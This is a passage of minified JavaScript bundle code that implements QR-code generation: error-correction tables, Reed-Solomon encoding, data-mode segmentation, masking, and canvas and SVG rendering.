r*4+17},Kh.getSymbolTotalCodewords=function(r){return e[r]},Kh.getBCHDigit=function(n){let r=0;for(;n!==0;)r++,n>>>=1;return r},Kh.setToSJISFunction=function(r){if(typeof r!="function")throw new Error('"toSJISFunc" is not a valid function.');t=r},Kh.isKanjiModeEnabled=function(){return typeof t<"u"},Kh.toSJIS=function(r){return t(r)},Kh}var Z9={},wW;function oj(){return wW||(wW=1,(function(t){t.L={bit:1},t.M={bit:0},t.Q={bit:3},t.H={bit:2};function e(n){if(typeof n!="string")throw new Error("Param is not a string");switch(n.toLowerCase()){case"l":case"low":return t.L;case"m":case"medium":return t.M;case"q":case"quartile":return t.Q;case"h":case"high":return t.H;default:throw new Error("Unknown EC Level: "+n)}}t.isValid=function(r){return r&&typeof r.bit<"u"&&r.bit>=0&&r.bit<4},t.from=function(r,i){if(t.isValid(r))return r;try{return e(r)}catch{return i}}})(Z9)),Z9}var Y9,vW;function V7e(){if(vW)return Y9;vW=1;function t(){this.buffer=[],this.length=0}return t.prototype={get:function(e){const n=Math.floor(e/8);return(this.buffer[n]>>>7-e%8&1)===1},put:function(e,n){for(let r=0;r<n;r++)this.putBit((e>>>n-r-1&1)===1)},getLengthInBits:function(){return this.length},putBit:function(e){const n=Math.floor(this.length/8);this.buffer.length<=n&&this.buffer.push(0),e&&(this.buffer[n]|=128>>>this.length%8),this.length++}},Y9=t,Y9}var Q9,EW;function W7e(){if(EW)return Q9;EW=1;function t(e){if(!e||e<1)throw new Error("BitMatrix size must be defined and greater than 0");this.size=e,this.data=new Uint8Array(e*e),this.reservedBit=new Uint8Array(e*e)}return t.prototype.set=function(e,n,r,i){const s=e*this.size+n;this.data[s]=r,i&&(this.reservedBit[s]=!0)},t.prototype.get=function(e,n){return this.data[e*this.size+n]},t.prototype.xor=function(e,n,r){this.data[e*this.size+n]^=r},t.prototype.isReserved=function(e,n){return this.reservedBit[e*this.size+n]},Q9=t,Q9}var J9={},_W;function G7e(){return _W||(_W=1,(function(t){const e=Qg().getSymbolSize;t.getRowColCoords=function(r){if(r===1)return[];const i=Math.floor(r/7)+2,s=e(r),o=s===145?26:Math.ceil((s-13)/(2*i-2))*2,a=[s-7];for(let c=1;c<i-1;c++)a[c]=a[c-1]-o;return a.push(6),a.reverse()},t.getPositions=function(r){const i=[],s=t.getRowColCoords(r),o=s.length;for(let a=0;a<o;a++)for(let c=0;c<o;c++)a===0&&c===0||a===0&&c===o-1||a===o-1&&c===0||i.push([s[a],s[c]]);return i}})(J9)),J9}var X9={},AW;function K7e(){if(AW)return X9;AW=1;const t=Qg().getSymbolSize,e=7;return X9.getPositions=function(r){const i=t(r);return[[0,0],[i-e,0],[0,i-e]]},X9}var eO={},CW;function Z7e(){return CW||(CW=1,(function(t){t.Patterns={PATTERN000:0,PATTERN001:1,PATTERN010:2,PATTERN011:3,PATTERN100:4,PATTERN101:5,PATTERN110:6,PATTERN111:7};const e={N1:3,N2:3,N3:40,N4:10};t.isValid=function(i){return i!=null&&i!==""&&!isNaN(i)&&i>=0&&i<=7},t.from=function(i){return t.isValid(i)?parseInt(i,10):void 0},t.getPenaltyN1=function(i){const s=i.size;let o=0,a=0,c=0,l=null,f=null;for(let h=0;h<s;h++){a=c=0,l=f=null;for(let m=0;m<s;m++){let b=i.get(h,m);b===l?a++:(a>=5&&(o+=e.N1+(a-5)),l=b,a=1),b=i.get(m,h),b===f?c++:(c>=5&&(o+=e.N1+(c-5)),f=b,c=1)}a>=5&&(o+=e.N1+(a-5)),c>=5&&(o+=e.N1+(c-5))}return o},t.getPenaltyN2=function(i){const s=i.size;let o=0;for(let a=0;a<s-1;a++)for(let c=0;c<s-1;c++){const l=i.get(a,c)+i.get(a,c+1)+i.get(a+1,c)+i.get(a+1,c+1);(l===4||l===0)&&o++}return o*e.N2},t.getPenaltyN3=function(i){const s=i.size;let o=0,a=0,c=0;for(let l=0;l<s;l++){a=c=0;for(let f=0;f<s;f++)a=a<<1&2047|i.get(l,f),f>=10&&(a===1488||a===93)&&o++,c=c<<1&2047|i.get(f,l),f>=10&&(c===1488||c===93)&&o++}return o*e.N3},t.getPenaltyN4=function(i){let s=0;const o=i.data.length;for(let c=0;c<o;c++)s+=i.data[c];return Math.abs(Math.ceil(s*100/o/5)-10)*e.N4};function n(r,i,s){switch(r){case t.Patterns.PATTERN000:return(i+s)%2===0;case t.Patterns.PATTERN001:return i%2===0;case t.Patterns.PATTERN010:return s%3===0;case t.Patterns.PATTERN011:return(i+s)%3===0;case t.Patterns.PATTERN100:return(Math.floor(i/2)+Math.floor(s/3))%2===0;case t.Patterns.PATTERN101:return i*s%2+i*s%3===0;case t.Patterns.PATTERN110:return(i*s%2+i*s%3)%2===0;case t.Patterns.PATTERN111:return(i*s%3+(i+s)%2)%2===0;default:throw new Error("bad maskPattern:"+r)}}t.applyMask=function(i,s){const o=s.size;for(let a=0;a<o;a++)for(let c=0;c<o;c++)s.isReserved(c,a)||s.xor(c,a,n(i,c,a))},t.getBestMask=function(i,s){const o=Object.keys(t.Patterns).length;let a=0,c=1/0;for(let l=0;l<o;l++){s(l),t.applyMask(l,i);const f=t.getPenaltyN1(i)+t.getPenaltyN2(i)+t.getPenaltyN3(i)+t.getPenaltyN4(i);t.applyMask(l,i),f<c&&(c=f,a=l)}return a}})(eO)),eO}var i6={},SW;function Qae(){if(SW)return i6;SW=1;const t=oj(),e=[1,1,1,1,1,1,1,1,1,1,2,2,1,2,2,4,1,2,4,4,2,4,4,4,2,4,6,5,2,4,6,6,2,5,8,8,4,5,8,8,4,5,8,11,4,8,10,11,4,9,12,16,4,9,16,16,6,10,12,18,6,10,17,16,6,11,16,19,6,13,18,21,7,14,21,25,8,16,20,25,8,17,23,25,9,17,23,34,9,18,25,30,10,20,27,32,12,21,29,35,12,23,34,37,12,25,34,40,13,26,35,42,14,28,38,45,15,29,40,48,16,31,43,51,17,33,45,54,18,35,48,57,19,37,51,60,19,38,53,63,20,40,56,66,21,43,59,70,22,45,62,74,24,47,65,77,25,49,68,81],n=[7,10,13,17,10,16,22,28,15,26,36,44,20,36,52,64,26,48,72,88,36,64,96,112,40,72,108,130,48,88,132,156,60,110,160,192,72,130,192,224,80,150,224,264,96,176,260,308,104,198,288,352,120,216,320,384,132,240,360,432,144,280,408,480,168,308,448,532,180,338,504,588,196,364,546,650,224,416,600,700,224,442,644,750,252,476,690,816,270,504,750,900,300,560,810,960,312,588,870,1050,336,644,952,1110,360,700,1020,1200,390,728,1050,1260,420,784,1140,1350,450,812,1200,1440,480,868,1290,1530,510,924,1350,1620,540,980,1440,1710,570,1036,1530,1800,570,1064,1590,1890,600,1120,1680,1980,630,1204,1770,2100,660,1260,1860,2220,720,1316,1950,2310,750,1372,2040,2430];return i6.getBlocksCount=function(i,s){switch(s){case t.L:return e[(i-1)*4+0];case t.M:return e[(i-1)*4+1];case t.Q:return e[(i-1)*4+2];case t.H:return e[(i-1)*4+3];default:return}},i6.getTotalCodewordsCount=function(i,s){switch(s){case t.L:return n[(i-1)*4+0];case t.M:return n[(i-1)*4+1];case t.Q:return n[(i-1)*4+2];case t.H:return n[(i-1)*4+3];default:return}},i6}var tO={},jv={},TW;function Y7e(){if(TW)return jv;TW=1;const t=new Uint8Array(512),e=new Uint8Array(256);return(function(){let r=1;for(let i=0;i<255;i++)t[i]=r,e[r]=i,r<<=1,r&256&&(r^=285);for(let i=255;i<512;i++)t[i]=t[i-255]})(),jv.log=function(r){if(r<1)throw new Error("log("+r+")");return e[r]},jv.exp=function(r){return t[r]},jv.mul=function(r,i){return r===0||i===0?0:t[e[r]+e[i]]},jv}var xW;function Q7e(){return xW||(xW=1,(function(t){const e=Y7e();t.mul=function(r,i){const s=new Uint8Array(r.length+i.length-1);for(let o=0;o<r.length;o++)for(let a=0;a<i.length;a++)s[o+a]^=e.mul(r[o],i[a]);return s},t.mod=function(r,i){let s=new Uint8Array(r);for(;s.length-i.length>=0;){const o=s[0];for(let c=0;c<i.length;c++)s[c]^=e.mul(i[c],o);let a=0;for(;a<s.length&&s[a]===0;)a++;s=s.slice(a)}return s},t.generateECPolynomial=function(r){let i=new Uint8Array([1]);for(let s=0;s<r;s++)i=t.mul(i,new Uint8Array([1,e.exp(s)]));return i}})(tO)),tO}var nO,IW;function J7e(){if(IW)return nO;IW=1;const t=Q7e();function e(n){this.genPoly=void 0,this.degree=n,this.degree&&this.initialize(this.degree)}return e.prototype.initialize=function(r){this.degree=r,this.genPoly=t.generateECPolynomial(this.degree)},e.prototype.encode=function(r){if(!this.genPoly)throw new Error("Encoder not initialized");const i=new Uint8Array(r.length+this.degree);i.set(r);const s=t.mod(i,this.genPoly),o=this.degree-s.length;if(o>0){const a=new Uint8Array(this.degree);return a.set(s,o),a}return s},nO=e,nO}var rO={},iO={},sO={},RW;function Jae(){return RW||(RW=1,sO.isValid=function(e){return!isNaN(e)&&e>=1&&e<=40}),sO}var Al={},PW;function Xae(){if(PW)return Al;PW=1;const t="[0-9]+",e="[A-Z $%*+\\-./:]+";let n="(?:[u3000-u303F]|[u3040-u309F]|[u30A0-u30FF]|[uFF00-uFFEF]|[u4E00-u9FAF]|[u2605-u2606]|[u2190-u2195]|u203B|[u2010u2015u2018u2019u2025u2026u201Cu201Du2225u2260]|[u0391-u0451]|[u00A7u00A8u00B1u00B4u00D7u00F7])+";n=n.replace(/u/g,"\\u");const r="(?:(?![A-Z0-9 $%*+\\-./:]|"+n+`)(?:.|[\r
]))+`;Al.KANJI=new RegExp(n,"g"),Al.BYTE_KANJI=new RegExp("[^A-Z0-9 $%*+\\-./:]+","g"),Al.BYTE=new RegExp(r,"g"),Al.NUMERIC=new RegExp(t,"g"),Al.ALPHANUMERIC=new RegExp(e,"g");const i=new RegExp("^"+n+"$"),s=new RegExp("^"+t+"$"),o=new RegExp("^[A-Z0-9 $%*+\\-./:]+$");return Al.testKanji=function(c){return i.test(c)},Al.testNumeric=function(c){return s.test(c)},Al.testAlphanumeric=function(c){return o.test(c)},Al}var NW;function Jg(){return NW||(NW=1,(function(t){const e=Jae(),n=Xae();t.NUMERIC={id:"Numeric",bit:1,ccBits:[10,12,14]},t.ALPHANUMERIC={id:"Alphanumeric",bit:2,ccBits:[9,11,13]},t.BYTE={id:"Byte",bit:4,ccBits:[8,16,16]},t.KANJI={id:"Kanji",bit:8,ccBits:[8,10,12]},t.MIXED={bit:-1},t.getCharCountIndicator=function(s,o){if(!s.ccBits)throw new Error("Invalid mode: "+s);if(!e.isValid(o))throw new Error("Invalid version: "+o);return o>=1&&o<10?s.ccBits[0]:o<27?s.ccBits[1]:s.ccBits[2]},t.getBestModeForData=function(s){return n.testNumeric(s)?t.NUMERIC:n.testAlphanumeric(s)?t.ALPHANUMERIC:n.testKanji(s)?t.KANJI:t.BYTE},t.toString=function(s){if(s&&s.id)return s.id;throw new Error("Invalid mode")},t.isValid=function(s){return s&&s.bit&&s.ccBits};function r(i){if(typeof i!="string")throw new Error("Param is not a string");switch(i.toLowerCase()){case"numeric":return t.NUMERIC;case"alphanumeric":return t.ALPHANUMERIC;case"kanji":return t.KANJI;case"byte":return t.BYTE;default:throw new Error("Unknown mode: "+i)}}t.from=function(s,o){if(t.isValid(s))return s;try{return r(s)}catch{return o}}})(iO)),iO}var OW;function X7e(){return OW||(OW=1,(function(t){const e=Qg(),n=Qae(),r=oj(),i=Jg(),s=Jae(),o=7973,a=e.getBCHDigit(o);function c(m,b,w){for(let y=1;y<=40;y++)if(b<=t.getCapacity(y,w,m))return y}function l(m,b){return i.getCharCountIndicator(m,b)+4}function f(m,b){let w=0;return m.forEach(function(y){const E=l(y.mode,b);w+=E+y.getBitsLength()}),w}function h(m,b){for(let w=1;w<=40;w++)if(f(m,w)<=t.getCapacity(w,b,i.MIXED))return w}t.from=function(b,w){return s.isValid(b)?parseInt(b,10):w},t.getCapacity=function(b,w,y){if(!s.isValid(b))throw new Error("Invalid QR Code version");typeof y>"u"&&(y=i.BYTE);const E=e.getSymbolTotalCodewords(b),A=n.getTotalCodewordsCount(b,w),R=(E-A)*8;if(y===i.MIXED)return R;const S=R-l(y,b);switch(y){case i.NUMERIC:return Math.floor(S/10*3);case i.ALPHANUMERIC:return Math.floor(S/11*2);case i.KANJI:return Math.floor(S/13);case i.BYTE:default:return Math.floor(S/8)}},t.getBestVersionForData=function(b,w){let y;const E=r.from(w,r.M);if(Array.isArray(b)){if(b.length>1)return h(b,E);if(b.length===0)return 1;y=b[0]}else y=b;return c(y.mode,y.getLength(),E)},t.getEncodedBits=function(b){if(!s.isValid(b)||b<7)throw new Error("Invalid QR Code version");let w=b<<12;for(;e.getBCHDigit(w)-a>=0;)w^=o<<e.getBCHDigit(w)-a;return b<<12|w}})(rO)),rO}var oO={},kW;function eDe(){if(kW)return oO;kW=1;const t=Qg(),e=1335,n=21522,r=t.getBCHDigit(e);return oO.getEncodedBits=function(s,o){const a=s.bit<<3|o;let c=a<<10;for(;t.getBCHDigit(c)-r>=0;)c^=e<<t.getBCHDigit(c)-r;return(a<<10|c)^n},oO}var aO={},cO,DW;function tDe(){if(DW)return cO;DW=1;const t=Jg();function e(n){this.mode=t.NUMERIC,this.data=n.toString()}return e.getBitsLength=function(r){return 10*Math.floor(r/3)+(r%3?r%3*3+1:0)},e.prototype.getLength=function(){return this.data.length},e.prototype.getBitsLength=function(){return e.getBitsLength(this.data.length)},e.prototype.write=function(r){let i,s,o;for(i=0;i+3<=this.data.length;i+=3)s=this.data.substr(i,3),o=parseInt(s,10),r.put(o,10);const a=this.data.length-i;a>0&&(s=this.data.substr(i),o=parseInt(s,10),r.put(o,a*3+1))},cO=e,cO}var uO,BW;function nDe(){if(BW)return uO;BW=1;const t=Jg(),e=["0","1","2","3","4","5","6","7","8","9","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"," ","$","%","*","+","-",".","/",":"];function n(r){this.mode=t.ALPHANUMERIC,this.data=r}return n.getBitsLength=function(i){return 11*Math.floor(i/2)+6*(i%2)},n.prototype.getLength=function(){return this.data.length},n.prototype.getBitsLength=function(){return n.getBitsLength(this.data.length)},n.prototype.write=function(i){let s;for(s=0;s+2<=this.data.length;s+=2){let o=e.indexOf(this.data[s])*45;o+=e.indexOf(this.data[s+1]),i.put(o,11)}this.data.length%2&&i.put(e.indexOf(this.data[s]),6)},uO=n,uO}var lO,jW;function rDe(){return jW||(jW=1,lO=function(e){for(var n=[],r=e.length,i=0;i<r;i++){var s=e.charCodeAt(i);if(s>=55296&&s<=56319&&r>i+1){var o=e.charCodeAt(i+1);o>=56320&&o<=57343&&(s=(s-55296)*1024+o-56320+65536,i+=1)}if(s<128){n.push(s);continue}if(s<2048){n.push(s>>6|192),n.push(s&63|128);continue}if(s<55296||s>=57344&&s<65536){n.push(s>>12|224),n.push(s>>6&63|128),n.push(s&63|128);continue}if(s>=65536&&s<=1114111){n.push(s>>18|240),n.push(s>>12&63|128),n.push(s>>6&63|128),n.push(s&63|128);continue}n.push(239,191,189)}return new Uint8Array(n).buffer}),lO}var dO,MW;function iDe(){if(MW)return dO;MW=1;const t=rDe(),e=Jg();function n(r){this.mode=e.BYTE,typeof r=="string"&&(r=t(r)),this.data=new Uint8Array(r)}return n.getBitsLength=function(i){return i*8},n.prototype.getLength=function(){return this.data.length},n.prototype.getBitsLength=function(){return n.getBitsLength(this.data.length)},n.prototype.write=function(r){for(let i=0,s=this.data.length;i<s;i++)r.put(this.data[i],8)},dO=n,dO}var fO,UW;function sDe(){if(UW)return fO;UW=1;const t=Jg(),e=Qg();function n(r){this.mode=t.KANJI,this.data=r}return n.getBitsLength=function(i){return i*13},n.prototype.getLength=function(){return this.data.length},n.prototype.getBitsLength=function(){return n.getBitsLength(this.data.length)},n.prototype.write=function(r){let i;for(i=0;i<this.data.length;i++){let s=e.toSJIS(this.data[i]);if(s>=33088&&s<=40956)s-=33088;else if(s>=57408&&s<=60351)s-=49472;else throw new Error("Invalid SJIS character: "+this.data[i]+`
Make sure your charset is UTF-8`);s=(s>>>8&255)*192+(s&255),r.put(s,13)}},fO=n,fO}var hO={exports:{}},LW;function oDe(){return LW||(LW=1,(function(t){var e={single_source_shortest_paths:function(n,r,i){var s={},o={};o[r]=0;var a=e.PriorityQueue.make();a.push(r,0);for(var c,l,f,h,m,b,w,y,E;!a.empty();){c=a.pop(),l=c.value,h=c.cost,m=n[l]||{};for(f in m)m.hasOwnProperty(f)&&(b=m[f],w=h+b,y=o[f],E=typeof o[f]>"u",(E||y>w)&&(o[f]=w,a.push(f,w),s[f]=l))}if(typeof i<"u"&&typeof o[i]>"u"){var A=["Could not find a path from ",r," to ",i,"."].join("");throw new Error(A)}return s},extract_shortest_path_from_predecessor_list:function(n,r){for(var i=[],s=r;s;)i.push(s),n[s],s=n[s];return i.reverse(),i},find_path:function(n,r,i){var s=e.single_source_shortest_paths(n,r,i);return e.extract_shortest_path_from_predecessor_list(s,i)},PriorityQueue:{make:function(n){var r=e.PriorityQueue,i={},s;n=n||{};for(s in r)r.hasOwnProperty(s)&&(i[s]=r[s]);return i.queue=[],i.sorter=n.sorter||r.default_sorter,i},default_sorter:function(n,r){return n.cost-r.cost},push:function(n,r){var i={value:n,cost:r};this.queue.push(i),this.queue.sort(this.sorter)},pop:function(){return this.queue.shift()},empty:function(){return this.queue.length===0}}};t.exports=e})(hO)),hO.exports}var FW;function aDe(){return FW||(FW=1,(function(t){const e=Jg(),n=tDe(),r=nDe(),i=iDe(),s=sDe(),o=Xae(),a=Qg(),c=oDe();function l(A){return unescape(encodeURIComponent(A)).length}function f(A,R,S){const v=[];let k;for(;(k=A.exec(S))!==null;)v.push({data:k[0],index:k.index,mode:R,length:k[0].length});return v}function h(A){const R=f(o.NUMERIC,e.NUMERIC,A),S=f(o.ALPHANUMERIC,e.ALPHANUMERIC,A);let v,k;return a.isKanjiModeEnabled()?(v=f(o.BYTE,e.BYTE,A),k=f(o.KANJI,e.KANJI,A)):(v=f(o.BYTE_KANJI,e.BYTE,A),k=[]),R.concat(S,v,k).sort(function(_,I){return _.index-I.index}).map(function(_){return{data:_.data,mode:_.mode,length:_.length}})}function m(A,R){switch(R){case e.NUMERIC:return n.getBitsLength(A);case e.ALPHANUMERIC:return r.getBitsLength(A);case e.KANJI:return s.getBitsLength(A);case e.BYTE:return i.getBitsLength(A)}}function b(A){return A.reduce(function(R,S){const v=R.length-1>=0?R[R.length-1]:null;return v&&v.mode===S.mode?(R[R.length-1].data+=S.data,R):(R.push(S),R)},[])}function w(A){const R=[];for(let S=0;S<A.length;S++){const v=A[S];switch(v.mode){case e.NUMERIC:R.push([v,{data:v.data,mode:e.ALPHANUMERIC,length:v.length},{data:v.data,mode:e.BYTE,length:v.length}]);break;case e.ALPHANUMERIC:R.push([v,{data:v.data,mode:e.BYTE,length:v.length}]);break;case e.KANJI:R.push([v,{data:v.data,mode:e.BYTE,length:l(v.data)}]);break;case e.BYTE:R.push([{data:v.data,mode:e.BYTE,length:l(v.data)}])}}return R}function y(A,R){const S={},v={start:{}};let k=["start"];for(let O=0;O<A.length;O++){const _=A[O],I=[];for(let T=0;T<_.length;T++){const B=_[T],U=""+O+T;I.push(U),S[U]={node:B,lastCount:0},v[U]={};for(let M=0;M<k.length;M++){const N=k[M];S[N]&&S[N].node.mode===B.mode?(v[N][U]=m(S[N].lastCount+B.length,B.mode)-m(S[N].lastCount,B.mode),S[N].lastCount+=B.length):(S[N]&&(S[N].lastCount=B.length),v[N][U]=m(B.length,B.mode)+4+e.getCharCountIndicator(B.mode,R))}}k=I}for(let O=0;O<k.length;O++)v[k[O]].end=0;return{map:v,table:S}}function E(A,R){let S;const v=e.getBestModeForData(A);if(S=e.from(R,v),S!==e.BYTE&&S.bit<v.bit)throw new Error('"'+A+'" cannot be encoded with mode '+e.toString(S)+`.
 Suggested mode is: `+e.toString(v));switch(S===e.KANJI&&!a.isKanjiModeEnabled()&&(S=e.BYTE),S){case e.NUMERIC:return new n(A);case e.ALPHANUMERIC:return new r(A);case e.KANJI:return new s(A);case e.BYTE:return new i(A)}}t.fromArray=function(R){return R.reduce(function(S,v){return typeof v=="string"?S.push(E(v,null)):v.data&&S.push(E(v.data,v.mode)),S},[])},t.fromString=function(R,S){const v=h(R,a.isKanjiModeEnabled()),k=w(v),O=y(k,S),_=c.find_path(O.map,"start","end"),I=[];for(let T=1;T<_.length-1;T++)I.push(O.table[_[T]].node);return t.fromArray(b(I))},t.rawSplit=function(R){return t.fromArray(h(R,a.isKanjiModeEnabled()))}})(aO)),aO}var $W;function cDe(){if($W)return K9;$W=1;const t=Qg(),e=oj(),n=V7e(),r=W7e(),i=G7e(),s=K7e(),o=Z7e(),a=Qae(),c=J7e(),l=X7e(),f=eDe(),h=Jg(),m=aDe();function b(O,_){const I=O.size,T=s.getPositions(_);for(let B=0;B<T.length;B++){const U=T[B][0],M=T[B][1];for(let N=-1;N<=7;N++)if(!(U+N<=-1||I<=U+N))for(let q=-1;q<=7;q++)M+q<=-1||I<=M+q||(N>=0&&N<=6&&(q===0||q===6)||q>=0&&q<=6&&(N===0||N===6)||N>=2&&N<=4&&q>=2&&q<=4?O.set(U+N,M+q,!0,!0):O.set(U+N,M+q,!1,!0))}}function w(O){const _=O.size;for(let I=8;I<_-8;I++){const T=I%2===0;O.set(I,6,T,!0),O.set(6,I,T,!0)}}function y(O,_){const I=i.getPositions(_);for(let T=0;T<I.length;T++){const B=I[T][0],U=I[T][1];for(let M=-2;M<=2;M++)for(let N=-2;N<=2;N++)M===-2||M===2||N===-2||N===2||M===0&&N===0?O.set(B+M,U+N,!0,!0):O.set(B+M,U+N,!1,!0)}}function E(O,_){const I=O.size,T=l.getEncodedBits(_);let B,U,M;for(let N=0;N<18;N++)B=Math.floor(N/3),U=N%3+I-8-3,M=(T>>N&1)===1,O.set(B,U,M,!0),O.set(U,B,M,!0)}function A(O,_,I){const T=O.size,B=f.getEncodedBits(_,I);let U,M;for(U=0;U<15;U++)M=(B>>U&1)===1,U<6?O.set(U,8,M,!0):U<8?O.set(U+1,8,M,!0):O.set(T-15+U,8,M,!0),U<8?O.set(8,T-U-1,M,!0):U<9?O.set(8,15-U-1+1,M,!0):O.set(8,15-U-1,M,!0);O.set(T-8,8,1,!0)}function R(O,_){const I=O.size;let T=-1,B=I-1,U=7,M=0;for(let N=I-1;N>0;N-=2)for(N===6&&N--;;){for(let q=0;q<2;q++)if(!O.isReserved(B,N-q)){let P=!1;M<_.length&&(P=(_[M]>>>U&1)===1),O.set(B,N-q,P),U--,U===-1&&(M++,U=7)}if(B+=T,B<0||I<=B){B-=T,T=-T;break}}}function S(O,_,I){const T=new n;I.forEach(function(q){T.put(q.mode.bit,4),T.put(q.getLength(),h.getCharCountIndicator(q.mode,O)),q.write(T)});const B=t.getSymbolTotalCodewords(O),U=a.getTotalCodewordsCount(O,_),M=(B-U)*8;for(T.getLengthInBits()+4<=M&&T.put(0,4);T.getLengthInBits()%8!==0;)T.putBit(0);const N=(M-T.getLengthInBits())/8;for(let q=0;q<N;q++)T.put(q%2?17:236,8);return v(T,O,_)}function v(O,_,I){const T=t.getSymbolTotalCodewords(_),B=a.getTotalCodewordsCount(_,I),U=T-B,M=a.getBlocksCount(_,I),N=T%M,q=M-N,P=Math.floor(T/M),C=Math.floor(U/M),j=C+1,z=P-C,$=new c(z);let H=0;const L=new Array(M),V=new Array(M);let G=0;const Z=new Uint8Array(O.buffer);for(let oe=0;oe<M;oe++){const ue=oe<q?C:j;L[oe]=Z.slice(H,H+ue),V[oe]=$.encode(L[oe]),H+=ue,G=Math.max(G,ue)}const J=new Uint8Array(T);let ne=0,re,le;for(re=0;re<G;re++)for(le=0;le<M;le++)re<L[le].length&&(J[ne++]=L[le][re]);for(re=0;re<z;re++)for(le=0;le<M;le++)J[ne++]=V[le][re];return J}function k(O,_,I,T){let B;if(Array.isArray(O))B=m.fromArray(O);else if(typeof O=="string"){let P=_;if(!P){const C=m.rawSplit(O);P=l.getBestVersionForData(C,I)}B=m.fromString(O,P||40)}else throw new Error("Invalid data");const U=l.getBestVersionForData(B,I);if(!U)throw new Error("The amount of data is too big to be stored in a QR Code");if(!_)_=U;else if(_<U)throw new Error(`
The chosen QR Code version cannot contain this amount of data.
Minimum version required to store current data is: `+U+`.
`);const M=S(_,I,B),N=t.getSymbolSize(_),q=new r(N);return b(q,_),w(q),y(q,_),A(q,I,0),_>=7&&E(q,_),R(q,M),isNaN(T)&&(T=o.getBestMask(q,A.bind(null,q,I))),o.applyMask(T,q),A(q,I,T),{modules:q,version:_,errorCorrectionLevel:I,maskPattern:T,segments:B}}return K9.create=function(_,I){if(typeof _>"u"||_==="")throw new Error("No input text");let T=e.M,B,U;return typeof I<"u"&&(T=e.from(I.errorCorrectionLevel,e.M),B=l.from(I.version),U=o.from(I.maskPattern),I.toSJISFunc&&t.setToSJISFunction(I.toSJISFunc)),k(_,B,T,U)},K9}var pO={},mO={},HW;function ece(){return HW||(HW=1,(function(t){function e(n){if(typeof n=="number"&&(n=n.toString()),typeof n!="string")throw new Error("Color should be defined as hex string");let r=n.slice().replace("#","").split("");if(r.length<3||r.length===5||r.length>8)throw new Error("Invalid hex color: "+n);(r.length===3||r.length===4)&&(r=Array.prototype.concat.apply([],r.map(function(s){return[s,s]}))),r.length===6&&r.push("F","F");const i=parseInt(r.join(""),16);return{r:i>>24&255,g:i>>16&255,b:i>>8&255,a:i&255,hex:"#"+r.slice(0,6).join("")}}t.getOptions=function(r){r||(r={}),r.color||(r.color={});const i=typeof r.margin>"u"||r.margin===null||r.margin<0?4:r.margin,s=r.width&&r.width>=21?r.width:void 0,o=r.scale||4;return{width:s,scale:s?4:o,margin:i,color:{dark:e(r.color.dark||"#000000ff"),light:e(r.color.light||"#ffffffff")},type:r.type,rendererOpts:r.rendererOpts||{}}},t.getScale=function(r,i){return i.width&&i.width>=r+i.margin*2?i.width/(r+i.margin*2):i.scale},t.getImageWidth=function(r,i){const s=t.getScale(r,i);return Math.floor((r+i.margin*2)*s)},t.qrToImageData=function(r,i,s){const o=i.modules.size,a=i.modules.data,c=t.getScale(o,s),l=Math.floor((o+s.margin*2)*c),f=s.margin*c,h=[s.color.light,s.color.dark];for(let m=0;m<l;m++)for(let b=0;b<l;b++){let w=(m*l+b)*4,y=s.color.light;if(m>=f&&b>=f&&m<l-f&&b<l-f){const E=Math.floor((m-f)/c),A=Math.floor((b-f)/c);y=h[a[E*o+A]?1:0]}r[w++]=y.r,r[w++]=y.g,r[w++]=y.b,r[w]=y.a}}})(mO)),mO}var zW;function uDe(){return zW||(zW=1,(function(t){const e=ece();function n(i,s,o){i.clearRect(0,0,s.width,s.height),s.style||(s.style={}),s.height=o,s.width=o,s.style.height=o+"px",s.style.width=o+"px"}function r(){try{return document.createElement("canvas")}catch{throw new Error("You need to specify a canvas element")}}t.render=function(s,o,a){let c=a,l=o;typeof c>"u"&&(!o||!o.getContext)&&(c=o,o=void 0),o||(l=r()),c=e.getOptions(c);const f=e.getImageWidth(s.modules.size,c),h=l.getContext("2d"),m=h.createImageData(f,f);return e.qrToImageData(m.data,s,c),n(h,l,f),h.putImageData(m,0,0),l},t.renderToDataURL=function(s,o,a){let c=a;typeof c>"u"&&(!o||!o.getContext)&&(c=o,o=void 0),c||(c={});const l=t.render(s,o,c),f=c.type||"image/png",h=c.rendererOpts||{};return l.toDataURL(f,h.quality)}})(pO)),pO}var gO={},qW;function lDe(){if(qW)return gO;qW=1;const t=ece();function e(i,s){const o=i.a/255,a=s+'="'+i.hex+'"';return o<1?a+" "+s+'-opacity="'+o.toFixed(2).slice(1)+'"':a}function n(i,s,o){let a=i+s;return typeof o<"u"&&(a+=" "+o),a}function r(i,s,o){let a="",c=0,l=!1,f=0;for(let h=0;h<i.length;h++){const m=Math.floor(h%s),b=Math.floor(h/s);!m&&!l&&(l=!0),i[h]?(f++,h>0&&m>0&&i[h-1]||(a+=l?n("M",m+o,.5+b+o):n("m",c,0),c=0,l=!1),m+1<s&&i[h+1]||(a+=n("h",f),f=0)):c++}return a}return gO.render=function(s,o,a){const c=t.getOptions(o),l=s.modules.size,f=s.modules.data,h=l+c.margin*2,m=c.color.light.a?"<path "+e(c.color.light,"fill")+' d="M0 0h'+h+"v"+h+'H0z"/>':"",b="<path "+e(c.color.dark,"stroke")+' d="'+r(f,l,c.margin)+'"/>',w='viewBox="0 0 '+h+" "+h+'"',E='<svg xmlns="http://www.w3.org/2000/svg" '+(c.width?'width="'+c.width+'" height="'+c.width+'" ':"")+w+' shape-rendering="crispEdges">'+m+b+`</svg>
`;return typeof a=="function"&&a(null,E),E},gO}var VW;function dDe(){if(VW)return lb;VW=1;const t=q7e(),e=cDe(),n=uDe(),r=lDe();function i(s,o,a,c,l){const f=[].slice.call(arguments,1),h=f.length,m=typeof f[h-1]=="function";if(!m&&!t())throw new Error("Callback required as last argument");if(m){if(h<2)throw new Error("Too few arguments provided");h===2?(l=a,a=o,o=c=void 0):h===3&&(o.getContext&&typeof l>"u"?(l=c,c=void 0):(l=c,c=a,a=o,o=void 0))}else{if(h<1)throw new Error("Too few arguments provided");return h===1?(a=o,o=c=void 0):h===2&&!o.getContext&&(c=a,a=o,o=void 0),new Promise(function(b,w){try{const y=e.create(a,c);b(s(y,o,c))}catch(y){w(y)}})}try{const b=e.create(a,c);l(null,s(b,o,c))}catch(b){l(b)}}return lb.create=e.create,lb.toCanvas=i.bind(null,n.render),lb.toDataURL=i.bind(null,n.renderToDataURL),lb.toString=i.bind(null,function(s,o,a){return r.render(s,a)}),lb}var fDe=dDe();const hDe=Vf(fDe),pDe=.1,WW=2.5,Fd=7;function yO(t,e,n){return t===e?!1:(t-e<0?e-t:t-e)<=n+pDe}function mDe(t,e){const 